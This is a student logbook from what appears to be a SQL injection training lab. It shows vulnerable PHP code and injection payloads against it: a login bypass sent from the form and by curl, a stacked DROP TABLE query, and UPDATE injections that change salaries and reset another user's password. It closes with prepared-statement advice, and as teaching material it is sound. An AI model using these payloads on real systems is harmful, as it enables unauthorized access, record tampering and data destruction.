# SQL Injection LogBook

This logbook pretends to documentante the work that was made in the SQL Injection lab, deduce some conclusions, identify the errors that were commited as well as to suggest the mosifications that would make the system secure to this type of attacks.

## Task 1

This first task is to adapt to the environment. We must use:

```sh
mysql -u root -pdees
```

and then we can use this

```sh
show tables;
```


## Task 2

In this attack, we were presented to the php file that is being ran under the server side.

```php
$input_uname = $_GET[’username’];
$input_pwd = $_GET[’Password’];
$hashed_pwd = sha1($input_pwd);
...
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
               nickname, Password
        FROM credential
        WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";
$result = $conn -> query($sql);
```

### Task 2.1 - Attack from webpage

Considering that we know the code, it is really easy to exploit this vulnerability:

`username: admin'; -- `


`password: <anything> `

This approach works, because the sql statement that will be queried to the database will be partionally connected and, with that, we can enter the system:

```sql
    SELECT id, name, eid, salary, birth, ssn, address, email,
               nickname, Password
        FROM credential
        WHERE name= ’admin’; -- and Password=’<anything>";
```

### Task 2.2 - Attack from command line

After that, the approach that was made was exaclty the same, but in the command line, it will go like this:

```sh
curl ’www.seed-server.com/unsafe_home.php?username=admin%27%20--%20&Password=<anything>’
```

This approach works and the justification is similar to task 2.1

### Task 2.3 - Append a new SQL statement

The next challange is to try to add a new sql statement in the project. Here is a way of how to do that:

`username: admin'; DROP TABLE credential; -- `


`password: <anything> `

This approach will lead to a query like this:

```sql
    SELECT id, name, eid, salary, birth, ssn, address, email,
               nickname, Password
        FROM credential
        WHERE name= ’admin’; DROP TABLE credential; -- and Password=’<anything>";
```

However, this query does not let to drop the table `creentia`. That occurs because the `$conn -> query($sql)` only executes the first query as a protection measure.

## Task 3

Here is the php code that executes the query that will update the database after editing the profile

```php
$hashed_pwd = sha1($input_pwd);
$sql = "UPDATE credential SET
   nickname=’$input_nickname’,
   email=’$input_email’,
   address=’$input_address’,
   Password=’$hashed_pwd’,
   PhoneNumber=’$input_phonenumber’
WHERE ID=$id;";
$conn->query($sql);
```

The form looks like this:

![Form2](images/LOGBOOK8/form2.png)

### Task 3.1 - Modify own salary

To do so, the parameters would be

`nickname: <nickname>', salary = 1000000 WHERE nickname = <nickname>; -- `

`email: <anything>`

`address: <anything>`

`password: <anything>`

`phone numer: <anything>`

With that, we reach the following sql code:

```sql
UPDATE credential SET
   nickname=’<nickname>’, salary = 1000000 WHERE nickname = <nickname>; -- email=’$input_email’, address=’$input_address’, Password=’$hashed_pwd’, PhoneNumber=’$input_phonenumber’ WHERE ID=$id;
```

### Task 3.2 - Reduce the Boby's salary

`nickname: Boby', salary = 1 WHERE nickname = Boby; -- `

`email: <anything>`

`address: <anything>`

`password: <anything>`

`phone numer: <anything>`

We reach the following query:

```sql
UPDATE credential SET
   nickname=’Boby’, salary = 1 WHERE nickname = Boby; -- email=’$input_email’, address=’$input_address’, Password=’$hashed_pwd’, PhoneNumber=’$input_phonenumber’ WHERE ID=$id;
```

### Task 3.3 - Modify other people’ password

For this example, assuming that we know that the password is hashed using the sha1 method, we can change the password manually. For instance, let's change the password of Boby to `banana`. If we consult [this site](http://www.sha1-online.com), we reach the hashed password, so we can see this:

`nickname: Boby', password = '250e77f12a5ab6972a0895d290c4792f0a326ea8' WHERE nickname = Boby; -- `

`email: <anything>`

`address: <anything>`

`password: <anything>`

`phone numer: <anything>`

```sql
UPDATE credential SET
   nickname=’Boby’, password = '250e77f12a5ab6972a0895d290c4792f0a326ea8' WHERE nickname = Boby; -- email=’$input_email’, address=’$input_address’, Password=’$hashed_pwd’, PhoneNumber=’$input_phonenumber’ WHERE ID=$id;
```

## How to prevent this kind of attack

Here are some suggestations to make this kind of attacks more difficult to occur:

1. Use Parameterized Statements (Prepared Statements). This will help to distinguish between the sql code and the sql data. Something like:

```php
$input_uname = $_GET['username'];
$input_pwd = $_GET['Password'];
$hashed_pwd = sha1($input_pwd);

$stmt = $conn->prepare("SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password
                        FROM credential
                        WHERE name=? AND Password=?");
$stmt->bind_param("ss", $input_uname, $hashed_pwd);

$stmt->execute();

$result = $stmt->get_result();
```

2. Input validation using regular expressions and others

